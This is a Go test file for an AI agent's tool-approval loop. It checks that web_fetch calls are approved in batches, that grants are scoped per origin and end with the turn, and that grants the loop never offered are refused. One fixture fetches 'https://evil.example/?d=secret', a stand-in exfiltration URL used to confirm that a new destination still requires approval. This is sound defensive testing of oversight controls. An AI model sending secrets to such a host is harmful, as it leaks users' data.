package loop

import (
	"context"
	"encoding/json"
	"net/url"
	"strings"
	"sync"
	"testing"

	"github.com/ginko97/ariadne/internal/llm"
	"github.com/ginko97/ariadne/internal/trace"
)

// fetches is one model step asking for several web_fetch calls at once, which
// is how the self-review that raised twenty cards actually arrived.
func fetches(ids []string, urls []string) llm.Response {
	blocks := []llm.Block{{Type: llm.BlockText, Text: "Reading those."}}
	for i, u := range urls {
		args, _ := json.Marshal(map[string]string{"url": u})
		blocks = append(blocks, llm.Block{Type: llm.BlockToolUse, ID: ids[i], Name: "web_fetch", Args: args})
	}
	return llm.Response{Blocks: blocks, Stop: llm.StopToolUse, Usage: llm.Usage{InputTokens: 10, OutputTokens: 10}}
}

// originKey is the policy cmd/ariadne wires in, reduced to what these tests
// need: web_fetch calls are grantable by origin, everything else is not.
func originKey(c llm.ToolCall) (string, bool) {
	if c.Name != "web_fetch" {
		return "", false
	}
	var in struct {
		URL string `json:"url"`
	}
	if json.Unmarshal(c.Args, &in) != nil {
		return "", false
	}
	u, err := url.Parse(in.URL)
	if err != nil || u.Host == "" {
		return "", false
	}
	return u.Scheme + "://" + strings.ToLower(u.Host), true
}

type batchRecorder struct {
	mu      sync.Mutex
	batches [][]string // call IDs per ApproveBatch call
	keys    [][]string
	answer  func(calls []llm.ToolCall, keys []string) BatchDecision
}

func (r *batchRecorder) approve(_ context.Context, calls []llm.ToolCall, keys []string) (BatchDecision, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	var ids []string
	for _, c := range calls {
		ids = append(ids, c.ID)
	}
	r.batches = append(r.batches, ids)
	r.keys = append(r.keys, keys)
	return r.answer(calls, keys), nil
}

func approveAll(calls []llm.ToolCall, _ []string) BatchDecision {
	d := BatchDecision{Approved: make([]bool, len(calls))}
	for i := range d.Approved {
		d.Approved[i] = true
	}
	return d
}

func batchAgent(fake *llm.Fake, rec *batchRecorder, ran *[]string, events *[]trace.Event) *Agent {
	var mu sync.Mutex
	return &Agent{
		Provider:        fake,
		Model:           "test",
		MaxSteps:        10,
		RequireApproval: []string{"web_fetch", "write_file"},
		Tools:           []llm.ToolDef{{Name: "web_fetch"}, {Name: "write_file"}},
		ApproveBatch:    rec.approve,
		GrantKey:        originKey,
		Trace: func(e trace.Event) {
			mu.Lock()
			*events = append(*events, e)
			mu.Unlock()
		},
		RunTool: func(_ context.Context, c llm.ToolCall) (llm.ToolResult, error) {
			mu.Lock()
			*ran = append(*ran, c.ID)
			mu.Unlock()
			return llm.ToolResult{Content: "ok"}, nil
		},
	}
}

// Six fetches in one step are one question, not six.
func TestOneStepsCallsToOneToolAreAskedTogether(t *testing.T) {
	fake := &llm.Fake{Responses: []llm.Response{
		fetches([]string{"a", "b", "c"}, []string{
			"https://github.com/x", "https://github.com/y", "https://api.github.com/z",
		}),
		endResponse("read them", 10, 10),
	}}
	rec := &batchRecorder{answer: approveAll}
	var ran []string
	var events []trace.Event
	a := batchAgent(fake, rec, &ran, &events)

	if _, err := a.Run(context.Background(), NewState("run_batch", "read")); err != nil {
		t.Fatal(err)
	}
	if len(rec.batches) != 1 || len(rec.batches[0]) != 3 {
		t.Fatalf("asked %v, want one batch of three", rec.batches)
	}
	want := []string{"https://github.com", "https://github.com", "https://api.github.com"}
	if strings.Join(rec.keys[0], ",") != strings.Join(want, ",") {
		t.Errorf("keys %v, want %v — the front end draws its checkboxes from these", rec.keys[0], want)
	}
	if len(ran) != 3 {
		t.Errorf("ran %v, want all three", ran)
	}
}

// A grant covers the same destination later in the turn, and nothing else.
// This is the property the gate exists for: a new destination still asks.
func TestGrantCoversOnlyThatDestinationForTheRestOfTheTurn(t *testing.T) {
	fake := &llm.Fake{Responses: []llm.Response{
		fetches([]string{"s1"}, []string{"https://github.com/readme"}),
		fetches([]string{"s2a", "s2b"}, []string{"https://github.com/license", "https://evil.example/?d=secret"}),
		endResponse("done", 10, 10),
	}}
	rec := &batchRecorder{}
	rec.answer = func(calls []llm.ToolCall, keys []string) BatchDecision {
		d := approveAll(calls, keys)
		if len(rec.batches) == 1 {
			d.Grants = []string{"https://github.com"}
		}
		return d
	}
	var ran []string
	var events []trace.Event
	a := batchAgent(fake, rec, &ran, &events)

	if _, err := a.Run(context.Background(), NewState("run_grant", "read")); err != nil {
		t.Fatal(err)
	}
	if len(rec.batches) != 2 {
		t.Fatalf("asked %d times, want 2", len(rec.batches))
	}
	if got := strings.Join(rec.batches[1], ","); got != "s2b" {
		t.Errorf("second step asked about %q, want only the new destination (s2b); the granted one must not ask again", got)
	}

	var granted, covered bool
	for _, e := range events {
		if e.Kind == trace.KindHostGrant && !e.IsError && strings.Contains(e.Content, "https://github.com") {
			granted = true
		}
		if e.Kind == trace.KindApproval && e.CallID == "s2a" && strings.Contains(e.Content, "allowed earlier in this turn") {
			covered = true
		}
	}
	if !granted {
		t.Error("the grant is not in the trace")
	}
	if !covered {
		t.Error("the call the grant let through is not attributed to it in the trace")
	}
}

// A grant ends with the turn. The next message starts with none, and nothing
// about it is written to the checkpoint.
func TestGrantsEndWithTheTurnAndAreNeverCheckpointed(t *testing.T) {
	fake := &llm.Fake{Responses: []llm.Response{
		fetches([]string{"t1"}, []string{"https://github.com/a"}),
		endResponse("first", 10, 10),
		fetches([]string{"t2"}, []string{"https://github.com/b"}),
		endResponse("second", 10, 10),
	}}
	rec := &batchRecorder{}
	rec.answer = func(calls []llm.ToolCall, keys []string) BatchDecision {
		d := approveAll(calls, keys)
		d.Grants = []string{"https://github.com"}
		return d
	}
	var ran []string
	var events []trace.Event
	a := batchAgent(fake, rec, &ran, &events)
	store := &Store{Dir: t.TempDir()}
	a.Checkpoint = store.Save

	s := NewState("run_20260922T100000_aaaaaa", "first")
	if _, err := a.Run(context.Background(), s); err != nil {
		t.Fatal(err)
	}
	if a.grants != nil {
		t.Errorf("grants survived the end of the turn: %v", a.grants)
	}
	if err := s.AddUserMessage("second"); err != nil {
		t.Fatal(err)
	}
	if _, err := a.Run(context.Background(), s); err != nil {
		t.Fatal(err)
	}
	if len(rec.batches) != 2 {
		t.Errorf("asked %d times across two turns, want 2 — the second turn must ask again", len(rec.batches))
	}

	cp, err := store.LoadCheckpoint(s.RunID)
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := json.Marshal(cp)
	if strings.Contains(string(raw), "allowed until") || strings.Contains(string(raw), "grants") {
		t.Errorf("a grant reached the checkpoint: %s", raw)
	}
}

// The loop, not the front end, decides what can be granted. A key nobody was
// shown, a key for a call that was denied, and any key when the policy grants
// nothing are all refused.
func TestGrantsTheLoopDidNotOfferAreRefused(t *testing.T) {
	cases := []struct {
		name     string
		grantKey func(llm.ToolCall) (string, bool)
		answer   func([]llm.ToolCall, []string) BatchDecision
	}{
		{"a key that was not offered", originKey, func(c []llm.ToolCall, k []string) BatchDecision {
			d := approveAll(c, k)
			d.Grants = []string{"https://evil.example"}
			return d
		}},
		{"a key whose only call was denied", originKey, func(c []llm.ToolCall, _ []string) BatchDecision {
			return BatchDecision{Approved: make([]bool, len(c)), Grants: []string{"https://github.com"}}
		}},
		{"any key when no policy is wired", nil, func(c []llm.ToolCall, k []string) BatchDecision {
			d := approveAll(c, k)
			d.Grants = []string{"https://github.com"}
			return d
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			fake := &llm.Fake{Responses: []llm.Response{
				fetches([]string{"u1"}, []string{"https://github.com/a"}),
				fetches([]string{"u2"}, []string{"https://github.com/b"}),
				endResponse("done", 10, 10),
			}}
			rec := &batchRecorder{answer: tc.answer}
			var ran []string
			var events []trace.Event
			a := batchAgent(fake, rec, &ran, &events)
			a.GrantKey = tc.grantKey

			if _, err := a.Run(context.Background(), NewState("run_refuse", "read")); err != nil {
				t.Fatal(err)
			}
			if len(rec.batches) != 2 {
				t.Errorf("asked %d times, want 2: the refused grant must not have covered the second call", len(rec.batches))
			}
		})
	}
}

// Denying one line of a batch denies that call and lets the rest run.
func TestDenyingOneLineOfABatch(t *testing.T) {
	fake := &llm.Fake{Responses: []llm.Response{
		fetches([]string{"d1", "d2", "d3"}, []string{"https://a.example/1", "https://b.example/2", "https://c.example/3"}),
		endResponse("done", 10, 10),
	}}
	rec := &batchRecorder{answer: func(c []llm.ToolCall, _ []string) BatchDecision {
		return BatchDecision{Approved: []bool{true, false, true}}
	}}
	var ran []string
	var events []trace.Event
	a := batchAgent(fake, rec, &ran, &events)

	if _, err := a.Run(context.Background(), NewState("run_line", "read")); err != nil {
		t.Fatal(err)
	}
	got := strings.Join(ran, ",")
	if strings.Contains(got, "d2") || !strings.Contains(got, "d1") || !strings.Contains(got, "d3") {
		t.Errorf("ran %q, want d1 and d3 but not d2", got)
	}
}

// Without ApproveBatch, every call is asked on its own: the terminal and the
// eval harness keep exactly the behaviour they had.
func TestWithoutApproveBatchEachCallIsAskedAlone(t *testing.T) {
	fake := &llm.Fake{Responses: []llm.Response{
		fetches([]string{"p1", "p2"}, []string{"https://a.example/1", "https://a.example/2"}),
		endResponse("done", 10, 10),
	}}
	var asked []string
	a := &Agent{
		Provider:        fake,
		Model:           "test",
		MaxSteps:        10,
		RequireApproval: []string{"web_fetch"},
		Tools:           []llm.ToolDef{{Name: "web_fetch"}},
		GrantKey:        originKey,
		Approve: func(_ context.Context, c llm.ToolCall) (bool, error) {
			asked = append(asked, c.ID)
			return true, nil
		},
		RunTool: func(context.Context, llm.ToolCall) (llm.ToolResult, error) { return llm.ToolResult{Content: "ok"}, nil },
	}
	if _, err := a.Run(context.Background(), NewState("run_alone", "read")); err != nil {
		t.Fatal(err)
	}
	if strings.Join(asked, ",") != "p1,p2" {
		t.Errorf("asked %v, want p1 then p2, one at a time", asked)
	}
}
